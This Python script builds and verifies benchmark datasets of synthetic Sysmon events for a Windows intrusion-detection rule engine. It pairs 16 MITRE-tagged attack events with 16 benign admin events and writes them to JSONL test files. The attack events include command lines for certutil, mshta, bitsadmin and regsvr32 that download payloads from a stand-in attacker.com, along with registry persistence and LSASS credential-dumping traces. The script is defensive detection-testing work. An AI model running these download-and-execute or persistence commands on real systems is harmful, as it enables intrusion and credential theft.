"""Helper script to construct verified benchmark datasets for attacks and benign noise."""

from datetime import datetime, timezone
from pathlib import Path

from app.detection.engine import DetectionEngine
from app.detection.loader import RuleLoader
from app.evaluation.loader import save_benchmark_dataset
from app.models.evaluation import BenchmarkEvent, BenchmarkLabel
from app.models.events import EventCategory, NormalizedEvent


def make_event(**kwargs) -> NormalizedEvent:
    defaults = {
        "event_id": 1,
        "record_id": 1,
        "provider": "Microsoft-Windows-Sysmon",
        "channel": "Microsoft-Windows-Sysmon/Operational",
        "computer": "WORKSTATION-01",
        "timestamp": datetime(2026, 11, 5, 12, 0, 0, tzinfo=timezone.utc),
        "event_category": EventCategory.PROCESS,
        "event_type": "ProcessCreate",
        "process_guid": "{11111111-2222-3333-4444-555555555555}",
        "process_id": 4321,
        "user": "CORP\\Administrator",
        "raw_payload": "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'/>",
        "event_hash": "a" * 64,
    }
    defaults.update(kwargs)
    return NormalizedEvent(**defaults)


def create_attack_dataset() -> list[BenchmarkEvent]:
    attacks = [
        (
            "WS-SYS-001",
            "Certutil Download",
            "T1105",
            make_event(
                event_id=1,
                image=r"C:\Windows\System32\certutil.exe",
                command_line=r"certutil.exe -urlcache -split -f http://attacker.com/beacon.exe C:\Temp\beacon.exe",
            ),
        ),
        (
            "WS-SYS-002",
            "Mshta Remote Execution",
            "T1218.005",
            make_event(
                event_id=1,
                image=r"C:\Windows\System32\mshta.exe",
                command_line=r"mshta.exe http://attacker.com/exploit.hta",
            ),
        ),
        (
            "WS-SYS-003",
            "BITSAdmin Download",
            "T1197",
            make_event(
                event_id=1,
                image=r"C:\Windows\System32\bitsadmin.exe",
                command_line=r"bitsadmin.exe /transfer myJob /download /priority high http://attacker.com/stage2.exe C:\Temp\stage2.exe",
            ),
        ),
        (
            "WS-SYS-004",
            "UAC Bypass via Fodhelper",
            "T1548.002",
            make_event(
                event_id=1,
                parent_image=r"C:\Windows\System32\fodhelper.exe",
                image=r"C:\Windows\System32\cmd.exe",
                command_line=r"cmd.exe /c whoami /priv",
            ),
        ),
        (
            "WS-SYS-005",
            "Rundll32 Suspicious Execution",
            "T1218.011",
            make_event(
                event_id=1,
                image=r"C:\Windows\System32\rundll32.exe",
                command_line=r"rundll32.exe C:\Users\victim\AppData\Local\Temp\evil.dll,DllRegisterServer",
            ),
        ),
        (
            "WS-SYS-006",
            "Whoami Reconnaissance",
            "T1033",
            make_event(
                event_id=1,
                image=r"C:\Windows\System32\whoami.exe",
                command_line=r"whoami.exe /priv",
            ),
        ),
        (
            "WS-SYS-007",
            "Regsvr32 Squiblydoo Remote Script",
            "T1218.010",
            make_event(
                event_id=1,
                image=r"C:\Windows\System32\regsvr32.exe",
                command_line=r"regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll",
            ),
        ),
        (
            "WS-SYS-008",
            "Remote Thread Injection into LSASS",
            "T1055.001",
            make_event(
                event_id=8,
                event_category=EventCategory.REMOTE_THREAD,
                target_image=r"C:\Windows\System32\lsass.exe",
                image=r"C:\Users\victim\malware.exe",
            ),
        ),
        (
            "WS-SYS-009",
            "Remote Thread into Sensitive Process",
            "T1055",
            make_event(
                event_id=8,
                event_category=EventCategory.REMOTE_THREAD,
                target_image=r"C:\Windows\explorer.exe",
                image=r"C:\Users\victim\AppData\Local\Temp\inject.exe",
            ),
        ),
        (
            "WS-SYS-010",
            "Suspicious LSASS GrantedAccess",
            "T1003.001",
            make_event(
                event_id=10,
                event_category=EventCategory.PROCESS_ACCESS,
                target_image=r"C:\Windows\System32\lsass.exe",
                granted_access="0x1010",
                image=r"C:\Users\victim\dump.exe",
            ),
        ),
        (
            "WS-SYS-011",
            "Mimikatz Sekurlsa Call Trace",
            "T1003.001",
            make_event(
                event_id=10,
                event_category=EventCategory.PROCESS_ACCESS,
                target_image=r"C:\Windows\System32\lsass.exe",
                call_trace=r"C:\Windows\System32\ntdll.dll+123|C:\Tools\sekurlsa.dll+456",
                image=r"C:\Tools\mimikatz.exe",
            ),
        ),
        (
            "WS-SYS-012",
            "Unsigned or Untrusted Driver Loaded",
            "T1068",
            make_event(
                event_id=6,
                event_category=EventCategory.DRIVER,
                image_loaded=r"C:\Windows\System32\drivers\rootkit.sys",
                signed="false",
            ),
        ),
        (
            "WS-SYS-013",
            "DLL Loaded from Temp Directory",
            "T1574.002",
            make_event(
                event_id=7,
                event_category=EventCategory.IMAGE_LOAD,
                image=r"C:\Windows\explorer.exe",
                image_loaded=r"C:\Users\victim\AppData\Local\Temp\payload.dll",
                signed="false",
            ),
        ),
        (
            "WS-SYS-014",
            "Registry Run Key Persistence",
            "T1547.001",
            make_event(
                event_id=12,
                event_category=EventCategory.REGISTRY,
                registry_event_type="SetValue",
                registry_target_object=r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Backdoor",
                registry_details=r"C:\ProgramData\evil.exe",
                image=r"C:\Windows\System32\reg.exe",
            ),
        ),
        (
            "WS-SYS-015",
            "IFEO Debugger Persistence",
            "T1546.012",
            make_event(
                event_id=12,
                event_category=EventCategory.REGISTRY,
                registry_event_type="SetValue",
                registry_target_object=r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger",
                registry_details=r"C:\evil.exe",
                image=r"C:\Windows\System32\reg.exe",
            ),
        ),
        (
            "WS-SYS-016",
            "Suspicious Dynamic DNS Query",
            "T1071.004",
            make_event(
                event_id=22,
                event_category=EventCategory.DNS,
                query_name="beacon.duckdns.org",
                image=r"C:\Users\victim\agent.exe",
            ),
        ),
    ]

    events: list[BenchmarkEvent] = []
    for rule_id, desc, mitre, ev in attacks:
        label = BenchmarkLabel(
            is_malicious=True,
            expected_rules=[rule_id],
            scenario=f"attack_{rule_id.lower().replace('-', '_')}",
            description=desc,
            mitre_attack=[mitre],
        )
        events.append(BenchmarkEvent(event=ev, label=label))
    return events


def create_benign_noise_dataset() -> list[BenchmarkEvent]:
    benign_items = [
        # 1. SCCM / MECM installation
        (
            "SCCM client policy sync and agent package distribution",
            make_event(
                event_id=1,
                image=r"C:\Windows\CCM\CcmExec.exe",
                command_line=r"C:\Windows\CCM\CcmExec.exe /service",
                user=r"NT AUTHORITY\SYSTEM",
            ),
        ),
        # 2. Windows Update TiWorker
        (
            "Windows Update servicing worker process",
            make_event(
                event_id=1,
                parent_image=r"C:\Windows\System32\TrustedInstaller.exe",
                image=r"C:\Windows\WinSxS\TiWorker.exe",
                command_line=r"C:\Windows\WinSxS\TiWorker.exe -Embedding",
                user=r"NT AUTHORITY\SYSTEM",
            ),
        ),
        # 3. Developer MSBuild compilation
        (
            "Visual Studio MSBuild compiling source code",
            make_event(
                event_id=1,
                image=r"C:\Program Files\Microsoft Visual Studio\MSBuild.exe",
                command_line=r"MSBuild.exe WinSentinel.sln /p:Configuration=Release",
                user=r"CORP\developer",
            ),
        ),
        # 4. Git status check
        (
            "Developer git command",
            make_event(
                event_id=1,
                image=r"C:\Program Files\Git\cmd\git.exe",
                command_line=r"git.exe status",
                user=r"CORP\developer",
            ),
        ),
        # 5. Legitimate admin PowerShell Get-Process
        (
            "Admin PowerShell inventory script",
            make_event(
                event_id=1,
                image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                command_line=r"powershell.exe -NoProfile -Command Get-Process",
                user=r"CORP\admin",
            ),
        ),
        # 6. Legitimate TaskMgr checking LSASS (filtered out by rule WS-SYS-010)
        (
            "Task Manager reading process handles from LSASS",
            make_event(
                event_id=10,
                event_category=EventCategory.PROCESS_ACCESS,
                image=r"C:\Windows\System32\taskmgr.exe",
                target_image=r"C:\Windows\System32\lsass.exe",
                granted_access="0x1010",
                user=r"NT AUTHORITY\SYSTEM",
            ),
        ),
        # 7. Legitimate CSRSS thread creation (filtered out by rule WS-SYS-008)
        (
            "Subsystem CSRSS thread creation in LSASS",
            make_event(
                event_id=8,
                event_category=EventCategory.REMOTE_THREAD,
                image=r"C:\Windows\System32\csrss.exe",
                target_image=r"C:\Windows\System32\lsass.exe",
                user=r"NT AUTHORITY\SYSTEM",
            ),
        ),
        # 8. Legitimate OneDrive Run key (filtered out by rule WS-SYS-014)
        (
            "OneDrive automatic startup registration",
            make_event(
                event_id=12,
                event_category=EventCategory.REGISTRY,
                image=r"C:\Users\victim\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe",
                registry_event_type="SetValue",
                registry_target_object=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDrive",
                registry_details=r"C:\Users\victim\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background",
                user=r"CORP\victim",
            ),
        ),
        # 9. Legitimate signed driver load
        (
            "WHQL signed network driver load",
            make_event(
                event_id=6,
                event_category=EventCategory.DRIVER,
                image_loaded=r"C:\Windows\System32\drivers\tcpip.sys",
                signed="true",
                signature="Microsoft Windows",
                signature_status="Valid",
            ),
        ),
        # 10. Legitimate signed DLL loaded from System32
        (
            "Standard Windows DLL load",
            make_event(
                event_id=7,
                event_category=EventCategory.IMAGE_LOAD,
                image=r"C:\Windows\System32\svchost.exe",
                image_loaded=r"C:\Windows\System32\kernel32.dll",
                signed="true",
                signature="Microsoft Windows",
                signature_status="Valid",
            ),
        ),
        # 11. Legitimate corporate DNS query
        (
            "Internal Active Directory DNS query",
            make_event(
                event_id=22,
                event_category=EventCategory.DNS,
                query_name="dc01.corp.internal",
                image=r"C:\Windows\System32\svchost.exe",
            ),
        ),
        # 12. Public Microsoft DNS query
        (
            "Windows Update public DNS resolution",
            make_event(
                event_id=22,
                event_category=EventCategory.DNS,
                query_name="update.microsoft.com",
                image=r"C:\Windows\System32\svchost.exe",
            ),
        ),
        # 13. Legitimate signed DLL in Temp directory (filtered out by WS-SYS-013)
        (
            "Microsoft signed installer helper DLL in Temp",
            make_event(
                event_id=7,
                event_category=EventCategory.IMAGE_LOAD,
                image=r"C:\Windows\System32\msiexec.exe",
                image_loaded=r"C:\Windows\Temp\msihelper.dll",
                signed="true",
                signature="Microsoft Corporation",
                signature_status="Valid",
            ),
        ),
        # 14. Standard reg query by explorer
        (
            "Explorer reading Shell Folders registry key",
            make_event(
                event_id=12,
                event_category=EventCategory.REGISTRY,
                image=r"C:\Windows\explorer.exe",
                registry_event_type="QueryValue",
                registry_target_object=r"HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",
                registry_details="",
            ),
        ),
        # 15. Standard svchost network communication
        (
            "System time synchronization",
            make_event(
                event_id=3,
                event_category=EventCategory.NETWORK,
                image=r"C:\Windows\System32\svchost.exe",
                destination_ip="20.101.57.9",
                destination_port=123,
                protocol="udp",
            ),
        ),
        # 16. Standard whoami execution without suspicious recon flags
        (
            "Routine batch script checking username without reconnaissance flags",
            make_event(
                event_id=1,
                image=r"C:\Windows\System32\whoami.exe",
                command_line=r"whoami.exe",
                user=r"CORP\victim",
            ),
        ),
    ]

    events: list[BenchmarkEvent] = []
    for desc, ev in benign_items:
        label = BenchmarkLabel(
            is_malicious=False,
            expected_rules=[],
            scenario="benign_admin_noise",
            description=desc,
        )
        events.append(BenchmarkEvent(event=ev, label=label))
    return events


def verify_datasets(attacks: list[BenchmarkEvent], benign: list[BenchmarkEvent]) -> None:
    loader = RuleLoader()
    rules = loader.load_rules_from_directory("rules/sysmon")
    engine = DetectionEngine()
    engine.load_rules(rules)

    print(f"Loaded {len(rules)} Sysmon rules.")

    # 1. Verify attacks
    attack_failures = []
    for b_event in attacks:
        expected = b_event.label.expected_rules
        matches = [m.rule_id for m in engine.evaluate_event(b_event.event)]
        for r_id in expected:
            if r_id not in matches:
                attack_failures.append(f"Attack expected '{r_id}' but got {matches}: {b_event.label.description}")

    if attack_failures:
        for f in attack_failures:
            print("FAIL:", f)
        raise RuntimeError("Attack dataset verification failed!")
    else:
        print("ALL 16 ATTACK SCENARIOS TRIGGERED THEIR EXPECTED RULES!")

    # 2. Verify benign noise
    benign_failures = []
    for idx, b_event in enumerate(benign, start=1):
        matches = [m.rule_id for m in engine.evaluate_event(b_event.event)]
        if matches:
            benign_failures.append(f"Benign event #{idx} ('{b_event.label.description}') triggered: {matches}")

    if benign_failures:
        for f in benign_failures:
            print("FAIL FP:", f)
        raise RuntimeError("Benign noise dataset triggered false positives!")
    else:
        print("ALL 16 BENIGN NOISE SCENARIOS PRODUCED 0 FALSE POSITIVES!")


def main():
    attacks = create_attack_dataset()
    benign = create_benign_noise_dataset()

    verify_datasets(attacks, benign)

    out_dir = Path("tests/data/benchmarks")
    out_dir.mkdir(parents=True, exist_ok=True)

    save_benchmark_dataset(out_dir / "attacks.jsonl", attacks)
    save_benchmark_dataset(out_dir / "benign_admin_noise.jsonl", benign)
    print(f"Saved {len(attacks)} attack events to {out_dir / 'attacks.jsonl'}")
    print(f"Saved {len(benign)} benign events to {out_dir / 'benign_admin_noise.jsonl'}")


if __name__ == "__main__":
    main()
